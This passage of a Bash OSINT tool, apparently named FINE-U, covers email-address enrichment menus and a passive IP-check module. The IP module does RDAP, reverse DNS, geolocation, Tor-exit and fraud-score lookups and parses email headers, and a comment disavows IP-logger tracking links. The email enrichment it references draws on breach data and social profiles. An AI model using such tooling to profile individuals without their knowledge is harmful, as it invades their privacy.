    printf '  %sCARI EMAIL & PENGAYAAN OSINT%s  %s(kosongkan lalu Enter untuk kembali)%s\n\n' "$B" "$R" "$D" "$R"
    printf '  %sValidasi, DNS, domain, jejak publik (Gravatar, GitHub), dan kebocoran data.%s\n\n' "$D" "$R"
    [ -n "$notice" ] && { printf '  %s%s%s\n\n' "$RED" "$notice" "$R"; notice=""; }
    printf '  Masukkan alamat email: '
    read -r in || exit 0
    in=$(sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//' <<< "$in"); in=${in,,}
    [ -z "$in" ] && return
    if ! email_valid "$in"; then
      notice="Alamat email tidak valid. Contoh: nama@domain.com (huruf, angka, titik, _ % + -)."
      continue
    fi
    header
    printf '  Memproses dan memperkaya data: %s%s%s\n\n' "$B" "$in" "$R"
    email_do_check "$in"
    menu email_result_screen "Cek email lain" "Kembali"
    [ "$CHOICE" -eq 2 ] && return
  done
}

cli_email() {
  local in=${1,,}
  email_valid "$in" || { echo "Alamat email tidak valid: $1" >&2; exit 1; }
  printf 'Memeriksa: %s\n\n' "$in"
  email_do_check "$in"
  render_email_report
  printf '  Tersimpan: %s\n' "$SAVED"
}

print_email_status() {
  local i act=0
  printf '\n  %sCEK EMAIL%s\n' "$B" "$R"
  for i in "${!EM_NAME[@]}"; do
    if em_active "${EM_REQ[i]}"; then
      act=$((act + 1))
      printf '  %s●%s %-20s %s%s%s\n' "$GRN" "$R" "${EM_NAME[i]}" "$D" "${EM_CAT[i]}" "$R"
    else
      printf '  %s○%s %-20s %s%s · %s%s\n' "$D" "$R" "${EM_NAME[i]}" "$D" "${EM_CAT[i]}" \
        "$([[ ${EM_REQ[i]} == cmd:* ]] && echo "pasang dulu: ${EM_REQ[i]#cmd:} (pipx install ${EM_REQ[i]#cmd:})" || echo "isi di Setting: ${EM_REQ[i]}")" "$R"
    fi
  done
  printf '\n  %s%d dari %d pemeriksaan email aktif%s' "$B" "$act" "${#EM_NAME[@]}" "$R"
  printf '  %s(jejak web: %s)%s\n' "$D" "$([ "${EMAIL_WEB_SCAN:-1}" = 0 ] && echo mati || echo aktif)" "$R"
}

# ---------- status sumber ----------
grid() { # $1=ikon  $2=warna  sisanya=nama; tiga kolom
  local icon=$1 color=$2 n=0 name; shift 2
  for name in "$@"; do
    [ $((n % 3)) -eq 0 ] && printf '  '
    printf '%s%s%s %-22s' "$color" "$icon" "$R" "$name"
    n=$((n + 1))
    [ $((n % 3)) -eq 0 ] && printf '\n'
  done
  [ $((n % 3)) -ne 0 ] && printf '\n'
  return 0
}

print_social_status() {
  local be i api=("Reddit" "GitHub") web=()
  printf '\n  %sMEDIA SOSIAL%s\n' "$B" "$R"
  if [ "$SOCIAL_SEARCH" = 0 ]; then
    printf '  %sDimatikan (SOCIAL_SEARCH=0). Hidupkan lewat menu Setting.%s\n' "$D" "$R"; return
  fi
  be=$(social_backend) || be=""
  for i in "${!SOC_NAME[@]}"; do
    if soc_is_web "$i"; then web+=("${SOC_NAME[i]}"); else api+=("${SOC_NAME[i]}"); fi
  done
  printf '  %sLangsung lewat API publik (%d):%s\n' "$D" "${#api[@]}" "$R"
  grid "●" "$GRN" "${api[@]}"
  if [ -n "$be" ]; then
    printf '  %sLewat mesin pencari web (%d), memakai %s:%s\n' "$D" "${#web[@]}" "$be" "$R"
    grid "●" "$GRN" "${web[@]}"
  else
    printf '  %sLewat mesin pencari web (%d). Perlu SearXNG / Brave / Tavily / Google CSE (menu Setting):%s\n' "$D" "${#web[@]}" "$R"
    grid "○" "$D" "${web[@]}"
  fi
}

print_quota_status() {
  local j api lim used any=0
  printf '\n  %sLIMIT HARIAN%s  %s(permintaan API per hari, reset tiap tengah malam)%s\n' "$B" "$R" "$D" "$R"
  for j in "${!LIM_ID[@]}"; do
    api=${LIM_ID[j]}; lim=$(quota_limit "$api"); used=$(quota_used "$api")
    [ "$lim" -eq 0 ] && [ "$used" -eq 0 ] && continue
    any=1
    if [ "$lim" -eq 0 ]; then
      printf '  %s○%s %-20s %s%d terpakai · tanpa batas%s\n' "$D" "$R" "${LIM_NAME[j]}" "$D" "$used" "$R"
    elif [ "$used" -ge "$lim" ]; then
      printf '  %s✖%s %-20s %s%d/%d · BATAS TERCAPAI%s\n' "$RED" "$R" "${LIM_NAME[j]}" "$RED" "$used" "$lim" "$R"
    else
      printf '  %s●%s %-20s %s%d/%d · sisa %d%s\n' "$GRN" "$R" "${LIM_NAME[j]}" "$D" "$used" "$lim" "$((lim - used))" "$R"
    fi
  done
  [ "$any" -eq 0 ] && printf '  %sBelum ada limit. Atur di menu Setting > Limit harian (0 = tanpa batas).%s\n' "$D" "$R"
  return 0
}

print_status() {
  local i act=0 total=0
  for i in "${!SRC_NAME[@]}"; do
    [ "${SRC_HIDE[i]}" = "1" ] && continue
    total=$((total + 1))
    if source_active "${SRC_REQ[i]}"; then
      act=$((act + 1))
      printf '  %s●%s %-20s %s%s%s\n' "$GRN" "$R" "${SRC_NAME[i]}" "$D" "${SRC_CAT[i]}" "$R"
    else
      printf '  %s○%s %-20s %s%s · isi di Setting: %s%s\n' "$D" "$R" "${SRC_NAME[i]}" "$D" "${SRC_CAT[i]}" "${SRC_REQ[i]}" "$R"
    fi
  done
  printf '\n  %s%d dari %d sumber umum aktif%s' "$B" "$act" "$total" "$R"
  printf '  %s(mode pencarian: %s)%s\n' "$D" "$SEARCH_MODE" "$R"
  print_social_status
  print_email_status
  print_quota_status
  printf '\n'
  if [ -f "$BASE/.env" ]; then printf '  %sKonfigurasi: %s%s\n' "$D" "$BASE/.env" "$R"
  else printf '  %sBelum ada .env. Buka menu Setting untuk mengisi API yang kamu punya.%s\n' "$D" "$R"; fi
}

# ======================================================================
# ---------- CEK IP ----------
# Analisis PASIF alamat IP yang sudah Anda punya: IP dari log server Anda sendiri, header email
# yang Anda terima, atau hasil resolve sebuah domain. FINE-U tidak membuat link pelacak / IP logger
# untuk menjebak orang lain: itu mengumpulkan IP seseorang tanpa sepengetahuannya.
# ======================================================================
IP_DIR="$BASE/hasil-ip"
IP_MAX=5   # jumlah IP maksimum yang diperiksa dalam satu kali jalan

ipv4_ok() {
  local o
  [[ $1 =~ ^([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})$ ]] || return 1
  for o in 1 2 3 4; do (( 10#${BASH_REMATCH[o]} <= 255 )) || return 1; done
}

ipv6_expand() { # -> 8 grup heksadesimal 4 digit dipisah ":" ; gagal jika bukan IPv6 yang valid
  local a=${1,,} head tail g n i
  local -a h=() t=() out=()
  local o1 o2 o3 o4
  if [[ $a =~ ^([0-9a-f:]*:)([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})$ ]]; then
    o1=$((10#${BASH_REMATCH[2]})); o2=$((10#${BASH_REMATCH[3]})); o3=$((10#${BASH_REMATCH[4]})); o4=$((10#${BASH_REMATCH[5]}))
    (( o1 <= 255 && o2 <= 255 && o3 <= 255 && o4 <= 255 )) || return 1
    a=$(printf '%s%x:%x' "${BASH_REMATCH[1]}" $((o1 * 256 + o2)) $((o3 * 256 + o4)))
  fi
  [[ $a =~ ^[0-9a-f:]+$ ]] || return 1
  [[ $a == *:::* ]] && return 1
  if [[ $a == *::* ]]; then
    [[ ${a#*::} == *::* ]] && return 1
    head=${a%%::*}; tail=${a#*::}
    [ -n "$head" ] && IFS=: read -ra h <<< "$head"
    [ -n "$tail" ] && IFS=: read -ra t <<< "$tail"
    n=$((8 - ${#h[@]} - ${#t[@]})); [ "$n" -lt 1 ] && return 1
    out=("${h[@]}"); for ((i = 0; i < n; i++)); do out+=(0); done; out+=("${t[@]}")
  else
    IFS=: read -ra out <<< "$a"
  fi
  [ "${#out[@]}" -eq 8 ] || return 1
  for g in "${out[@]}"; do [[ $g =~ ^[0-9a-f]{1,4}$ ]] || return 1; done
  printf '%04x:%04x:%04x:%04x:%04x:%04x:%04x:%04x' $(for g in "${out[@]}"; do echo $((16#$g)); done)
}

ip_version() { # 4 atau 6 ; gagal jika bukan alamat IP
  if ipv4_ok "$1"; then echo 4; elif ipv6_expand "$1" >/dev/null; then echo 6; else return 1; fi
}

ip_scope() { # publik | privat | loopback | link-local | CGNAT | multicast | dokumentasi | reserved
  local ip=$1 a b c x
  if ipv4_ok "$ip"; then
    IFS=. read -r a b c _ <<< "$ip"; a=$((10#$a)); b=$((10#$b)); c=$((10#$c))
    if   [ "$a" -eq 10 ] || { [ "$a" -eq 172 ] && [ "$b" -ge 16 ] && [ "$b" -le 31 ]; } || { [ "$a" -eq 192 ] && [ "$b" -eq 168 ]; }; then echo privat
    elif [ "$a" -eq 127 ]; then echo loopback
    elif [ "$a" -eq 169 ] && [ "$b" -eq 254 ]; then echo link-local
    elif [ "$a" -eq 100 ] && [ "$b" -ge 64 ] && [ "$b" -le 127 ]; then echo CGNAT
    elif [ "$a" -ge 224 ] && [ "$a" -le 239 ]; then echo multicast
    elif [ "$a" -eq 0 ] || [ "$a" -ge 240 ]; then echo reserved
    elif { [ "$a" -eq 192 ] && [ "$b" -eq 0 ] && [ "$c" -eq 2 ]; } || { [ "$a" -eq 198 ] && [ "$b" -eq 51 ] && [ "$c" -eq 100 ]; } \
         || { [ "$a" -eq 203 ] && [ "$b" -eq 0 ] && [ "$c" -eq 113 ]; }; then echo dokumentasi
    else echo publik; fi
  else
    x=$(ipv6_expand "$ip") || return 1
    case "$x" in
      0000:0000:0000:0000:0000:0000:0000:0001) echo loopback ;;
      0000:0000:0000:0000:0000:0000:0000:0000) echo reserved ;;
      fe[89ab]*) echo link-local ;;
      f[cd]*) echo privat ;;
      ff*) echo multicast ;;
      2001:0db8*) echo dokumentasi ;;
      *) echo publik ;;
    esac
  fi
}

ip_ptr_name() { # nama DNS untuk pencarian PTR
  local ip=$1 a b c d x
  if ipv4_ok "$ip"; then
    IFS=. read -r a b c d <<< "$ip"
    printf '%d.%d.%d.%d.in-addr.arpa' $((10#$d)) $((10#$c)) $((10#$b)) $((10#$a))
  else
    x=$(ipv6_expand "$ip") || return 1; x=${x//:/}
    printf '%sip6.arpa' "$(printf '%s' "$x" | rev | sed 's/./&./g')"
  fi
}

net_kind() { # $1 = teks nama organisasi / ISP -> perkiraan jenis jaringan
  local t=${1,,}
  case "$t" in
    "") echo "" ;;
    *cloudflare*|*akamai*|*fastly*|*cloudfront*|*incapsula*|*imperva*) echo "CDN / proxy: IP milik penyedia CDN, bukan server asli pemilik situs" ;;
    *amazon*|*aws*|*google*|*microsoft*|*azure*|*digitalocean*|*ovh*|*hetzner*|*linode*|*vultr*|*contabo*|*alibaba*|*tencent*|*oracle*|*hosting*|*datacenter*|*"data center"*|*cloud*|*server*|*vps*)
      echo "pusat data / hosting: kemungkinan bukan pengguna rumahan" ;;
    *telkomsel*|*indosat*|*axiata*|*smartfren*|*hutchison*|*mobile*|*cellular*|*wireless*|*lte*)
      echo "jaringan seluler: satu IP sering dipakai banyak pelanggan sekaligus (CGNAT)" ;;
    *) echo "kemungkinan ISP / jaringan akses" ;;
  esac
}

tor_list() { # cache daftar node keluar Tor (diperbarui tiap 1 jam); cetak path
  local f="$CACHE_DIR/tor-exit.txt"
  mkdir -p "$CACHE_DIR"
  if [ ! -s "$f" ] || [ -n "$(find "$f" -mmin +60 2>/dev/null)" ]; then
    fetch "https://check.torproject.org/torbulkexitlist" 2>/dev/null | tr -d '\r' | grep -E '^[0-9a-fA-F.:]+$' > "$f.tmp"
    if [ -s "$f.tmp" ]; then mv "$f.tmp" "$f"; else rm -f "$f.tmp"; fi
  fi
  [ -s "$f" ] && printf '%s' "$f"
}

# ---------- modul pemeriksaan IP (satu objek JSON per modul, sama seperti modul email) ----------
ipm_rdap() {
  local ip=$1 r code body info
  local -a _L=() _K=() _F=()
  r=$(http_get -L -H 'accept: application/rdap+json' "https://rdap.org/ip/$ip") || return 1
  code=${r##*$'\n'}; body=${r%$'\n'*}
  if [ "$code" != 200 ]; then
    addl "RDAP" "data registrasi tidak tersedia (kode $code)"
    emit rdap "RDAP / WHOIS" info 0 "data registrasi tidak tersedia"; return 0
  fi
  info=$(jq -c 'def vc($k): (.vcardArray[1]? // []) | map(select(.[0] == $k)) | (.[0][3]? // "");
    def ents: [.. | objects | select(has("roles") and has("vcardArray"))];
    { name: (.name // ""), start: (.startAddress // ""), end: (.endAddress // ""),
      cidr: ((.cidr0_cidrs // []) | map(((.v4prefix // .v6prefix // "") + "/" + ((.length // 0) | tostring))) | join(", ")),
      country: (.country // ""),
      org: (ents | map(select((.roles | index("registrant")) or (.roles | index("administrative")) or (.roles | index("technical"))) | vc("fn")) | map(select(. != "")) | (.[0] // "")),
      abuse: (ents | map(select(.roles | index("abuse")) | vc("email")) | map(select(. != "")) | (.[0] // "")) }' <<< "$body") || return 1
  local name org cidr start end country abuse
  name=$(jq -r '.name' <<< "$info"); org=$(jq -r '.org' <<< "$info"); cidr=$(jq -r '.cidr' <<< "$info")
  start=$(jq -r '.start' <<< "$info"); end=$(jq -r '.end' <<< "$info"); country=$(jq -r '.country' <<< "$info")
  abuse=$(jq -r '.abuse' <<< "$info")
  [ -n "$name" ] && addl "Nama jaringan" "$name"
  [ -n "$org" ] && addl "Organisasi" "$org"
  [ -n "$cidr" ] && addl "Blok IP (CIDR)" "$cidr"
  [ -z "$cidr" ] && [ -n "$start" ] && addl "Rentang IP" "$start - $end"
  [ -n "$country" ] && addl "Negara registrasi" "$country (negara pemegang blok IP, bukan lokasi pengguna)"
  [ -n "$abuse" ] && addl "Kontak abuse" "$abuse"
  addk "RDAP" "https://rdap.org/ip/$ip"
  emit rdap "RDAP / WHOIS" info 0 "${org:-${name:-terdaftar}}"
}

ipm_rdns() {
  local ip=$1 name j ptr
  local -a _L=() _K=() _F=()
  name=$(ip_ptr_name "$ip") || return 1
  j=$(doh "$name" PTR) || return 1
  ptr=$(jq -r '[.Answer[]? | select(.type == 12) | .data | sub("\\.$"; "")] | unique | join(", ")' <<< "$j") || return 1
  if [ -n "$ptr" ]; then addl "Hostname (PTR)" "$ptr"; emit rdns "Reverse DNS" info 0 "$ptr"
  else addl "Hostname (PTR)" "tidak ada catatan PTR"; emit rdns "Reverse DNS" info 0 "tidak ada catatan PTR"; fi
}

ipm_geo() {
  local ip=$1 j src city region country cc lat lon tz asn org isp kind x sum loc=""
  local -a _L=() _K=() _F=()
  j=$(fetch "https://ipwho.is/$ip" 2>/dev/null) || j=""
  if jq -e '.success == true' >/dev/null 2>&1 <<< "$j"; then
    src="ipwho.is"
    j=$(jq -c '{city:(.city // ""), region:(.region // ""), country:(.country // ""), cc:(.country_code // ""),
      lat:((.latitude // "") | tostring), lon:((.longitude // "") | tostring), tz:(.timezone.id // ""),
      asn:((.connection.asn // "") | tostring), org:(.connection.org // ""), isp:(.connection.isp // "")}' <<< "$j")
  else
    j=$(fetch "https://ipinfo.io/$ip/json") || return 1
    jq -e 'has("ip") and ((.bogon // false) | not)' >/dev/null 2>&1 <<< "$j" || return 1
    src="ipinfo.io"
    j=$(jq -c '{city:(.city // ""), region:(.region // ""), country:(.country // ""), cc:(.country // ""),
      lat:(((.loc // "") | split(",")[0]) // ""), lon:(((.loc // "") | split(",")[1]) // ""), tz:(.timezone // ""),
      asn:((((.org // "") | capture("^AS(?<n>[0-9]+)")? | .n)) // ""), org:((.org // "") | sub("^AS[0-9]+ +"; "")), isp:""}' <<< "$j")
  fi
  city=$(jq -r '.city' <<< "$j"); region=$(jq -r '.region' <<< "$j"); country=$(jq -r '.country' <<< "$j")
  cc=$(jq -r '.cc' <<< "$j"); lat=$(jq -r '.lat' <<< "$j"); lon=$(jq -r '.lon' <<< "$j"); tz=$(jq -r '.tz' <<< "$j")
  asn=$(jq -r '.asn' <<< "$j"); org=$(jq -r '.org' <<< "$j"); isp=$(jq -r '.isp' <<< "$j")
  for x in "$city" "$region" "$country"; do [ -n "$x" ] && loc+="${loc:+, }$x"; done
  [ -n "$loc" ] && addl "Lokasi perkiraan" "$loc"
  [ -n "$lat" ] && [ -n "$lon" ] && addl "Koordinat" "$lat, $lon  (titik jaringan ISP, bukan alamat rumah atau pemilik perangkat)"
  [ -n "$asn" ] && addl "ASN" "AS${asn#AS}"
  [ -n "$isp" ] && addl "ISP" "$isp"
  [ -n "$org" ] && [ "$org" != "$isp" ] && addl "Organisasi" "$org"
  [ -n "$tz" ] && addl "Zona waktu" "$tz"
  kind=$(net_kind "$isp $org"); [ -n "$kind" ] && addl "Jenis jaringan (perkiraan)" "$kind"
  addl "Sumber" "$src"
  [ -n "$lat" ] && [ -n "$lon" ] && addk "Peta (perkiraan)" "https://www.openstreetmap.org/?mlat=$lat&mlon=$lon#map=9/$lat/$lon"
  sum=${loc:-lokasi tidak diketahui}
  if [ -n "$isp" ]; then sum+=" · $isp"; elif [ -n "$org" ]; then sum+=" · $org"; fi
  emit geo "Geolokasi & ISP" info 0 "$sum"
}

ipm_tor() {
  local ip=$1 f
  local -a _L=() _K=() _F=()
  if ! ipv4_ok "$ip"; then
    addl "Status" "pemeriksaan node keluar Tor hanya untuk IPv4"
    emit tor "Node keluar Tor" info 0 "hanya IPv4"; return 0
  fi
  f=$(tor_list) || return 1
  if grep -qxF "$ip" "$f"; then
    addl "Status" "terdaftar sebagai node keluar Tor"
    emit tor "Node keluar Tor" warn 0 "ya: lalu lintas Tor, bukan satu pengguna tertentu"
  else
    addl "Status" "tidak ada di daftar node keluar Tor (torproject.org)"
    emit tor "Node keluar Tor" ok 0 "bukan node keluar Tor"
  fi
}

ipm_ipqs() {
  local ip=$1 j fs state=ok
  local -a _L=() _K=() _F=()
  quota_take ipqs || return 1
  j=$(fetch "https://www.ipqualityscore.com/api/json/ip/$IPQS_API_KEY/$ip") || return 1
  jq -e '.success == true' >/dev/null 2>&1 <<< "$j" || return 1
  fs=$(jq -r '.fraud_score // 0' <<< "$j")
  addl "Skor fraud" "$fs/100"
  addl "Proxy / VPN / Tor" "$(jq -r '"proxy " + (if .proxy then "ya" else "tidak" end) + ", VPN " + (if .vpn then "ya" else "tidak" end) + ", Tor " + (if .tor then "ya" else "tidak" end)' <<< "$j")"
  addl "Bot" "$(jq -r 'if .bot_status then "ya" else "tidak" end' <<< "$j")"
  addl "Penyalahgunaan terbaru" "$(jq -r 'if .recent_abuse then "ya" else "tidak" end' <<< "$j")"
  [ "$(jq -r '.connection_type // empty' <<< "$j")" != "" ] && addl "Tipe koneksi" "$(jq -r '.connection_type' <<< "$j")"
  if [ "$fs" -ge 85 ]; then state=bad; elif [ "$fs" -ge 50 ]; then state=warn; fi
  jq -e '.recent_abuse == true' >/dev/null 2>&1 <<< "$j" && state=bad
  emit ipqs "IPQualityScore" "$state" 0 "skor fraud $fs/100"
}

IPM_NAME=(); IPM_CAT=(); IPM_FN=(); IPM_REQ=()
register_ip() { IPM_NAME+=("$1"); IPM_CAT+=("$2"); IPM_FN+=("$3"); IPM_REQ+=("${4:-}"); }
register_ip "RDAP / WHOIS"    "Jaringan"  ipm_rdap
register_ip "Reverse DNS"     "Jaringan"  ipm_rdns
register_ip "Geolokasi & ISP" "Lokasi"    ipm_geo
register_ip "Node keluar Tor" "Reputasi"  ipm_tor
register_ip "IPQualityScore"  "Reputasi"  ipm_ipqs IPQS_API_KEY

run_ip_scan() { # $1=ip $2=label animasi ; hasil JSON satu IP di $IPDATA
  local ip=$1 label=$2 ver scope i n=0 id f name cat why
  ver=$(ip_version "$ip"); scope=$(ip_scope "$ip")
  if [ "$scope" != publik ]; then
    IPDATA=$(jq -nc --arg ip "$ip" --argjson v "$ver" --arg s "$scope" '{ip:$ip, version:$v, scope:$s, modules:[], checked:0, failed:[]}'); return
  fi
  ETMP=$(mktemp -d)
  for i in "${!IPM_NAME[@]}"; do
    em_active "${IPM_REQ[i]}" || continue
    n=$((n + 1)); id=$(printf '%03d' "$n")
    printf '%s|%s' "${IPM_NAME[i]}" "${IPM_CAT[i]}" > "$ETMP/$id.meta"
    (
      set -o pipefail
      QUOTA_MARK="$ETMP/$id.quota"
      if "${IPM_FN[i]}" "$ip" > "$ETMP/$id.tmp" 2>/dev/null && jq -e 'type == "object"' "$ETMP/$id.tmp" >/dev/null 2>&1; then
        mv "$ETMP/$id.tmp" "$ETMP/$id.json"
      else : > "$ETMP/$id.fail"; fi
      : > "$ETMP/$id.done"
    ) &
  done
  spin_wait "$ETMP" "$n" "$label"
  : > "$ETMP/all.ndjson"
  for f in "$ETMP"/*.meta; do
    [ -e "$f" ] || continue
    id=$(basename "$f" .meta); IFS='|' read -r name cat < "$f"
    if [ -f "$ETMP/$id.json" ]; then
      jq -c --arg c "$cat" '. + {category:$c}' "$ETMP/$id.json" >> "$ETMP/all.ndjson"
    else
      why="tidak bisa dijangkau saat ini"
      [ -s "$ETMP/$id.quota" ] && why="batas harian tercapai (atur di Setting > Limit harian)"
      jq -nc --arg t "$name" --arg c "$cat" --arg w "$why" \
        '{id:"gagal", title:$t, state:"fail", delta:0, summary:$w, lines:[], links:[], facts:[], category:$c}' >> "$ETMP/all.ndjson"
    fi
  done
  IPDATA=$(jq -s --arg ip "$ip" --argjson v "$ver" --arg s "$scope" \
    '{ip:$ip, version:$v, scope:$s, modules:., checked:length, failed:(map(select(.state == "fail") | .title))}' "$ETMP/all.ndjson")
  rm -rf "$ETMP"; ETMP=""
}

# ---------- analisis header email ----------
parse_mail_header() { # $1 = file -> JSON ringkasan; IP diurutkan dari hop terlama
  local f=$1 h line ip from rp reply subj dt mid fdom rdom auth spf dkim dmarc hints hops
  h=$(head -c 1048576 "$f" | tr -d '\r' | awk '/^$/ {exit} /^[ \t]/ { sub(/^[ \t]+/, " "); line = line $0; next } { if (line != "") print line; line = $0 } END { if (line != "") print line }')
  gv() { grep -i -m1 "^$1:" <<< "$h" | sed -E 's/^[^:]*:[[:space:]]*//'; }
  from=$(gv From); rp=$(gv Return-Path); reply=$(gv Reply-To); subj=$(gv Subject); dt=$(gv Date); mid=$(gv Message-ID)
  dom() { grep -oE '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+' <<< "$1" | head -1 | sed 's/.*@//' | tr 'A-Z' 'a-z'; }
  fdom=$(dom "$from"); rdom=$(dom "$reply")
  auth=$(grep -i -m1 '^Authentication-Results:' <<< "$h")
  spf=$(grep -oiE 'spf=[a-z]+' <<< "$auth" | head -1 | cut -d= -f2 | tr 'A-Z' 'a-z')
  [ -z "$spf" ] && spf=$(grep -i -m1 '^Received-SPF:' <<< "$h" | sed -E 's/^[^:]*:[[:space:]]*//' | awk '{print tolower($1)}')
  dkim=$(grep -oiE 'dkim=[a-z]+' <<< "$auth" | head -1 | cut -d= -f2 | tr 'A-Z' 'a-z')
  dmarc=$(grep -oiE 'dmarc=[a-z]+' <<< "$auth" | head -1 | cut -d= -f2 | tr 'A-Z' 'a-z')
  hints=$(grep -iE '^(X-Originating-IP|X-Sender-IP|X-Real-IP):' <<< "$h" | grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b')
  hops=$(grep -i '^Received:' <<< "$h" | tac | while IFS= read -r line; do
    grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' <<< "$line"
    grep -oiE '\[(IPv6:)?[0-9a-f:]{3,}\]' <<< "$line" | tr -d '[]' | sed 's/^[Ii][Pp][Vv]6://'
  done)
  local -a all=() pub=()
  while IFS= read -r ip; do [ -n "$ip" ] && all+=("$ip"); done < <(printf '%s\n%s\n' "$hints" "$hops" | awk 'NF && !seen[$0]++')
  for ip in "${all[@]}"; do
    ip_version "$ip" >/dev/null 2>&1 && [ "$(ip_scope "$ip")" = publik ] && pub+=("$ip")
  done
  jq -nc --arg file "$(basename "$f")" --arg from "$from" --arg fdom "$fdom" --arg rp "$rp" --arg reply "$reply" --arg rdom "$rdom" \
    --arg subj "$subj" --arg date "$dt" --arg mid "$mid" --arg spf "$spf" --arg dkim "$dkim" --arg dmarc "$dmarc" \
    --argjson hints "$(printf '%s\n' "$hints" | jq -Rsc 'split("\n") | map(select(. != ""))')" \
    --argjson hops "$(printf '%s\n' "${all[@]}" | jq -Rsc 'split("\n") | map(select(. != ""))')" \
    --argjson pub "$(printf '%s\n' "${pub[@]}" | jq -Rsc 'split("\n") | map(select(. != ""))')" \
    '{file:$file, from:$from, fromDomain:$fdom, returnPath:$rp, replyTo:$reply, replyDomain:$rdom, subject:$subj, date:$date,
      messageId:$mid, spf:$spf, dkim:$dkim, dmarc:$dmarc, hints:$hints, hops:$hops, publicIps:$pub}'
}

# ---------- baca masukan: IP, domain, atau file header email ----------
ip_collect() { # $1 = masukan -> IP_LIST IP_KIND IP_INPUT IP_HEADER IP_DOMAIN IP_EXTRA ; gagal -> IP_ERR
  local in=$1 f host t j x
  IP_LIST=(); IP_KIND=""; IP_INPUT=""; IP_HEADER=null; IP_DOMAIN=""; IP_EXTRA=0; IP_ERR=""
  in=${in%\"}; in=${in#\"}; in=${in%\'}; in=${in#\'}
  f=${in/#\~/$HOME}
  if [ -f "$f" ]; then
    [ -r "$f" ] || { IP_ERR="File tidak bisa dibaca."; return 1; }
    IP_KIND=header; IP_INPUT=$(basename "$f")
    IP_HEADER=$(parse_mail_header "$f") || { IP_ERR="Header email tidak bisa dibaca."; return 1; }
    mapfile -t IP_LIST < <(jq -r '.publicIps[]' <<< "$IP_HEADER")
  elif ip_version "${in,,}" >/dev/null 2>&1; then
    IP_KIND=ip; IP_INPUT=${in,,}; IP_LIST=("$IP_INPUT")
  elif is_url_like "$in"; then
    host=$(url_host "$in"); IP_KIND=domain; IP_INPUT=$host; IP_DOMAIN=$host
    for t in "A:1" "AAAA:28"; do
      j=$(doh "$host" "${t%%:*}" 2>/dev/null) || continue
      while IFS= read -r x; do [ -n "$x" ] && ip_version "$x" >/dev/null 2>&1 && IP_LIST+=("$x"); done \
        < <(jq -r --argjson ty "${t##*:}" '.Answer[]? | select(.type == $ty) | .data' <<< "$j" 2>/dev/null)
    done
    [ "${#IP_LIST[@]}" -eq 0 ] && { IP_ERR="Domain \"$host\" tidak punya alamat IP yang bisa di-resolve."; return 1; }
  else
    IP_ERR="Masukan tidak dikenali. Isi alamat IP (mis. 8.8.8.8), domain (mis. contoh.com), atau path file header email (.eml / .txt)."
    return 1
  fi
  if [ "${#IP_LIST[@]}" -gt "$IP_MAX" ]; then IP_EXTRA=$(( ${#IP_LIST[@]} - IP_MAX )); IP_LIST=("${IP_LIST[@]:0:IP_MAX}"); fi
  return 0
}

ip_slug() {
  local s
  s=$(printf '%s' "$1" | tr 'A-Z' 'a-z' | sed -e 's/[^a-z0-9._-]\{1,\}/-/g' -e 's/^[-.]*//' | cut -c1-80)
  printf '%s' "${s:-tanpa-nama}"
}

save_ip_report() { # mencetak path relatif file .md
  local dir="$IP_DIR/$(ip_slug "$IP_KIND-$IP_INPUT")" ts
  ts=$(date +%Y-%m-%d_%H-%M-%S)
  mkdir -p "$dir"
  printf '%s\n' "$IPREPORT" > "$dir/$ts.json"
  jq -r '
    "# Cek IP: \(.input)\n",
    "\(.kind) · \(.date)\n",
    (if .header != null then
       "## Kepala email\n",
       "- Dari: \(.header.from)", "- Return-Path: \(.header.returnPath)", "- Reply-To: \(.header.replyTo)",
       "- SPF: \(.header.spf) · DKIM: \(.header.dkim) · DMARC: \(.header.dmarc)",
       "- Jalur server (lama ke baru): \(.header.hops | join(" → "))", ""
     else empty end),
    (.ips[] | "## \(.ip) (\(.scope), IPv\(.version))\n",
       (.modules[] | "### \(.title) · \(.summary)\n", (.lines[] | "- \(.k): \(.v)"), (.links[] | "- [\(.t)](\(.u))"), ""))
  ' <<< "$IPREPORT" > "$dir/$ts.md"
  printf '%s' "${dir/#$PWD\//}/$ts.md"
}

ip_do_check() { # setelah ip_collect berhasil; mengisi IPREPORT dan SAVED
  local i n=${#IP_LIST[@]} items=()
  for i in "${!IP_LIST[@]}"; do
    run_ip_scan "${IP_LIST[i]}" "Memeriksa ${IP_LIST[i]} ($((i + 1))/$n)"
    items+=("$IPDATA")
  done
  IPREPORT=$(jq -nc --arg in "$IP_INPUT" --arg kind "$IP_KIND" --arg d "$(date -Iseconds)" --arg dom "$IP_DOMAIN" \
    --argjson h "$IP_HEADER" --argjson extra "$IP_EXTRA" --argjson ips "$(arr_json "${items[@]}")" \
    '{type:"ip", input:$in, kind:$kind, date:$d, domain:$dom, header:$h, extra:$extra, ips:$ips}')
  SAVED=$(save_ip_report)
}

render_ip_report() {
  local width kind
  width=$(( $(tput cols 2>/dev/null || echo 90) - 12 ))
  kind=$(jq -r '.kind' <<< "$IPREPORT")
  if [ "$kind" = domain ]; then
    printf '  %sDomain%s %s%s%s  %s→ %s IP%s\n\n' "$D" "$R" "$B" "$(jq -r '.domain' <<< "$IPREPORT")" "$R" "$D" "$(jq -r '.ips | length' <<< "$IPREPORT")" "$R"
  fi
  if [ "$(jq -r '.header != null' <<< "$IPREPORT")" = true ]; then
    jq -r --arg B "$B" --arg D "$D" --arg G "$GRN" --arg Y "$YEL" --arg RD "$RED" --arg R "$R" --argjson w "$width" '
      def cut($n): gsub("\\s+";" ") | if length > $n then .[0:$n-1] + "…" else . end;
      def st($v): if $v == "pass" then $G + "pass" + $R elif $v == "" then $D + "tidak ada" + $R else $RD + $v + $R end;
      def row($k; $v): if $v == "" then empty else "  \($D)\($k + (" " * (14 - ($k | length))))\($R)\($v | cut($w - 16))" end;
      .header as $h
      | "  \($B)KEPALA EMAIL\($R)  \($D)(\($h.file))\($R)",
        row("Dari"; $h.from), row("Return-Path"; $h.returnPath), row("Reply-To"; $h.replyTo), row("Tanggal"; $h.date),
        "  \($D)Autentikasi  \($R) SPF \(st($h.spf))  ·  DKIM \(st($h.dkim))  ·  DMARC \(st($h.dmarc))",
